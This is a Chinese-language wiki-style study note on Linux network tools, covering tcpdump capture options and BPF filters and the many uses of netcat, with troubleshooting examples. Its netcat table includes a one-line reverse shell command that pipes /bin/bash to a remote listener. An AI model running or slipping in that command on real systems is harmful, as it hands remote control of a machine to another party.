---
type: entity
tags: [networking, tcpdump, netcat, tools, linux-kernel, packet-capture, troubleshooting]
created: 2026-05-22
sources: [notes-tools]
---

# Linux Network Tools（网络诊断工具）

## 定义

Linux 网络诊断工具是用于网络抓包、连接测试、数据传输的命令行工具。本笔记聚焦 tcpdump（抓包分析）和 netcat（网络瑞士军刀）两个核心工具。

## 关键要点

### tcpdump — 命令行网络抓包

tcpdump 基于 libpcap 库实现，使用 BPF (Berkeley Packet Filter) 语法过滤数据包。

**核心选项**：

| 选项 | 作用 |
|------|------|
| `-i eth0` | 指定网络接口，`-i any` 监听所有 |
| `-n` / `-nn` | 禁止 DNS/端口名解析，避免延迟 |
| `-w file.pcap` / `-r file.pcap` | 写入/读取 pcap 文件 |
| `-v` / `-vv` | 详细输出（TTL、TOS 等） |
| `-c N` | 捕获 N 个包后退出 |
| `-X` / `-XX` | 十六进制+ASCII 显示 |

**BPF 过滤器表达式**：

```
# 协议过滤
tcpdump tcp / udp / icmp / arp

# 主机过滤
tcpdump host 192.168.1.100
tcpdump src host 192.168.1.100
tcpdump dst net 192.168.1.0/24

# 端口过滤
tcpdump port 80
tcpdump portrange 8000-9000

# 逻辑组合
tcpdump 'host 192.168.1.100 and (port 80 or port 443)'
tcpdump 'tcp and not port 22'
```

**TCP 标志位抓取**：

```
tcpdump 'tcp[tcpflags] & tcp-syn != 0'     # SYN 包
tcpdump 'tcp[tcpflags] & tcp-rst != 0'     # RST 包
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'  # SYN-ACK
```

**输出格式解读**：时间戳 → 协议 → 源 IP:端口 → `>` → 目标 IP:端口 → Flags → seq/ack/win/length

**与 Wireshark 配合**：tcpdump 在服务器端高效抓包保存为 `.pcap`，然后传输到分析机用 Wireshark/tshark 深度分析。

### netcat — 网络瑞士军刀

netcat (nc) 通过 stdin/stdout 进行 TCP/UDP 通信，使其极易通过管道与其他命令组合。

**核心功能矩阵**：

| 功能 | 命令模式 | 说明 |
|------|---------|------|
| 原始 TCP 连接 | `nc host port` | 建立连接，可发送/接收数据 |
| 端口监听 | `nc -l -p port` | 作为简易 TCP 服务器 |
| 端口扫描 | `nc -v -z host port-range` | Zero-I/O 模式快速探测 |
| 文件传输 | 接收端 `nc -l port > file`，发送端 `nc host port < file` | 配合重定向 |
| 目录传输 | `tar -cvf - dir | nc -l port` / `nc host port | tar xvf -` | 配合 tar 管道 |
| 磁盘克隆 | `dd if=/dev/sda | nc -l port` / `nc host port | dd of=/dev/sdb` | 配合 dd 管道 |
| 反向 Shell | 目标 `nc host port -e /bin/bash`，控制端 `nc -l port` | 远程命令执行 |
| 代理连接 | `-X protocol -x proxy:port` | SOCKS4/5 或 HTTPS 代理 |

**关键参数**：`-u` UDP 模式、`-w timeout` 超时、`-k` 持续监听、`-s` 指定源地址、`-p` 指定源端口

**变种**：ncat (Nmap 项目)、socat（更强大）、pnetcat、sbd。不同系统实现有差异但接口基本兼容。

## 常见诊断场景

### HTTP 服务调试
```bash
# 抓取 HTTP 流量
tcpdump -i eth0 -A port 80

# 手动发送 HTTP 请求
echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# 检查 HTTP 响应头
tcpdump -i eth0 -nn -tttt port 80
```

### TCP 连接问题排查
```bash
# 查看 TCP 握手过程（SYN / SYN-ACK / ACK）
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

# 检测连接重置
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'
```

## 相关概念

- [[entities/tools/port-scanning]] — 端口扫描（masscan + nmap）与网络诊断互补
- [[entities/security]] — tcpdump 广泛用于安全审计和取证
- [[entities/linux/kernel/net/linux-kernel-net-subsystem]] — 网络抓包依赖内核 sk_buff 和协议栈
- [[entities/os/os-io-model]] — netcat 的 I/O 模型涉及阻塞式 socket 编程

## 来源详情

- [[sources/notes-tools]] — tcpdump 使用指南和 netcat 使用笔记
